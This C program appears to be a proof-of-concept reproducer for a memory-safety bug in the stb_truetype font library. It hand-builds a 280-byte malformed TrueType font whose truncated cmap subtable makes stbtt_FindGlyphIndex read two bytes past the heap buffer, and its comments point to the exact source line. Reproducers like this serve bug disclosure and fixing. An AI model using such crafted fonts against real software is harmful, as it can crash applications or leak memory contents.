#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STB_TRUETYPE_IMPLEMENTATION
#include "../stb_truetype.h"

static void put_u16(uint8_t *p, size_t off, uint16_t v) {
   p[off] = (uint8_t)(v >> 8);
   p[off+1] = (uint8_t)(v & 0xff);
}

static void put_u32(uint8_t *p, size_t off, uint32_t v) {
   p[off] = (uint8_t)(v >> 24);
   p[off+1] = (uint8_t)(v >> 16);
   p[off+2] = (uint8_t)(v >> 8);
   p[off+3] = (uint8_t)(v & 0xff);
}

int main(void) {
   // Build a minimal TrueType font (280 bytes). The Format 4 cmap subtable
   // ends at the buffer boundary so the binary search loop in
   // stbtt_FindGlyphIndex reads 2 bytes past the allocation (data+280).
   //
   // Layout:
   //   0-11     Offset table (numTables=7)
   //   12-123   7 table directory entries
   //   124-177  head  (54 bytes)
   //   178-213  hhea  (36 bytes)
   //   214-217  hmtx  (4 bytes)
   //   218-223  maxp  (6 bytes)
   //   224-231  loca  (8 bytes)
   //   232-251  glyf  (20 bytes)
   //   252-255  cmap header (4 bytes)
   //   256-263  cmap encoding record (8 bytes)
   //   264-279  Format 4 subtable (16 bytes, truncated)
   //   ^^^^^^^^ buffer ends here; binary search reads at +280 -> OOB

   size_t font_size = 280;
   uint8_t *font = (uint8_t *)calloc(font_size, 1);
   if (!font) return 2;

   // --- Offset Table -------------------------------------------------------
   put_u32(font, 0, 0x00010000); // sfVersion
   put_u16(font, 4, 7);          // numTables = 7
   put_u16(font, 6, 64);         // searchRange
   put_u16(font, 8, 3);          // entrySelector
   put_u16(font, 10, 48);        // rangeShift

   // --- Table Directory Entries --------------------------------------------
   static const char *tags[7] = {"cmap","head","hhea","hmtx","maxp","loca","glyf"};
   static uint32_t  toff[7] = {252, 124, 178, 214, 218, 224, 232};
   static uint32_t  tlen[7] = { 28,  54,  36,   4,   6,   8,  20};
   for (int i = 0; i < 7; i++) {
      size_t base = 12 + 16 * i;
      memcpy(font + base, tags[i], 4);
      put_u32(font, base + 8, toff[i]);
      put_u32(font, base + 12, tlen[i]);
   }

   // --- head (124) ---------------------------------------------------------
   put_u32(font, 142, 0x5F0F3CF5); // magicNumber
   put_u16(font, 174, 1);           // indexToLocFormat = long

   // --- hhea (178) ---------------------------------------------------------
   put_u16(font, 212, 1);           // numOfLongHorMetrics

   // --- hmtx (214) ---------------------------------------------------------
   put_u16(font, 214, 1024);        // advanceWidth for glyph 0

   // --- maxp (218) ---------------------------------------------------------
   put_u16(font, 222, 1);           // numGlyphs = 1

   // --- loca (224) ---------------------------------------------------------
   put_u32(font, 224, 0);           // glyph 0 offset
   put_u32(font, 228, 20);          // glyf size

   // --- glyf (232) - empty glyph -------------------------------------------
   put_u16(font, 232, 0);           // numberOfContours = 0

   // --- cmap header (252) --------------------------------------------------
   put_u16(font, 252, 0);           // version
   put_u16(font, 254, 1);           // numTables = 1

   // cmap encoding record (256)
   put_u16(font, 256, 3);           // platformID = Microsoft
   put_u16(font, 258, 1);           // encodingID = Unicode BMP
   put_u32(font, 260, 12);          // subtableOffset -> index_map = 252+12 = 264

   // --- Format 4 subtable (264, truncated to 16 bytes) ---------------------
   put_u16(font, 264, 4);           // format = 4
   put_u16(font, 266, 16);          // length = 16
   put_u16(font, 268, 0);           // language = 0
   put_u16(font, 270, 8);           // segcountX2 = 8 (segcount = 4)
   put_u16(font, 272, 8);           // searchRange = 8
   put_u16(font, 274, 2);           // entrySelector = 2
   put_u16(font, 276, 0);           // rangeShift = 0
   put_u16(font, 278, 0xFFFF);      // endCount[0] = 0xFFFF
   // Buffer ends at byte 280.
   // Binary search reads ttUSHORT(data + 280) -> OOB at stb_truetype.h:1559.

   stbtt_fontinfo info;
   if (!stbtt_InitFont(&info, font, 0)) {
      printf("InitFont returned 0\n");
      free(font);
      return 0;
   }

   int glyph = stbtt_FindGlyphIndex(&info, 0x0041);
   printf("Glyph index: %d\n", glyph);
   free(font);
   return 0;
}
